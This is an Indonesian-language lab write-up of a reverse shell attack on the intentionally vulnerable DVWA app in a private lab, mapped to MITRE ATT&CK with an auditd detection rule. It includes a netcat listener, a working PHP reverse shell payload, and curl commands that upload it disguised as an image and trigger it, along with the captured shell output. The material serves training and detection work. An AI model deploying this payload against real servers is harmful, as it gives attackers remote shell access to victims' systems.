# Reverse Shell Attack

## Deskripsi
Setelah webshell berhasil diupload, attacker spawn reverse shell
yang membuat koneksi balik dari server korban ke attacker,
memberikan akses shell penuh.

## MITRE ATT&CK
- Tactic: Execution
- Technique: T1059.004 — Unix Shell

## Prerequisites
Webshell sudah terupload (lihat 05-file-upload-webshell)

## Attack Steps

### Step 1 — Setup Listener di Kali
```bash
nc -lvnp 4444
```

### Step 2 — Buat Reverse Shell PHP
```bash
cat > /tmp/rev.php << 'REVSHELL'
<?php
$sock=fsockopen("192.168.217.129",4444);
$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);
?>
REVSHELL
```

### Step 3 — Upload dan Trigger
```bash
SESS="PHPSESSID=YOUR_SESSION; security=low"
curl -s "http://192.168.217.130/DVWA/vulnerabilities/upload/" \
  -b "$SESS" \
  -F "uploaded=@/tmp/rev.php;type=image/jpeg" \
  -F "Upload=Upload"

# Trigger reverse shell
curl "http://192.168.217.130/DVWA/hackable/uploads/rev.php"
```

### Step 4 — Shell Diterima di Listener
connect to [192.168.217.129] from (UNKNOWN) [192.168.217.130]
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

## Detection
- Rule ID: 100050 (Auditd — reverse shell execution)
- Level: 15 (Critical)
- Auditd: exe="/usr/bin/dash" key="reverse_shell"
- cwd="/var/www/html/DVWA/hackable/uploads"
